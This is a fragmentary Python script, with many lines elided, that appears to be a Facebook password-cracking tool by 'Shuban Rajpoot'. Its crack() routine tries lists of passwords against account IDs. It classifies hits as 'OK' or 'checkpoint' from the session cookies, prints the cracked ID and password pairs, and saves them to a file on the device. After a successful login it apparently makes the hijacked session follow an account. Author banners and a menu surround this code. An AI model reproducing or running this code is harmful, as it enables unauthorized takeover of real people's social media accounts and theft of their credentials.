...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r %s[ Shuban💘 Rajpoot] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m [ Shuban 💘 Rajpoot-CP ] {idf} | {pw}')
				...
				print(f'\r\x1b[1;92m [ Shuban 💘 Rajpoot-OK ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/Shuban 💘 Rajpoot-OK.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
__________________×______________________
  ...
  Auther   :  Shuban Rajpoot 
 
  QUALITY  :  Jatav_CHORI

  OY  SUN  : DILL MAI AATA HUN SAMAJH MAI NHI 

INSTAGRAM  : Official_NASHA_03...BINDASH_YASHIKA

 Facebook  :  Shuban Rajpoot..⭐⭐⭐⭐⭐
...
class Main:
	def __init__(self):
		...
		print(" [E] Shuban 💘 Rajpoot new tool\n")
		MAJID =input(" Choose : ")
		if MAJID in ["1", "01"]:
			File()
		if MAJID in ["2", "02"]:
  ...
  "Mozilla/5.0 (Windows NT 6.1; rv:36.0) 
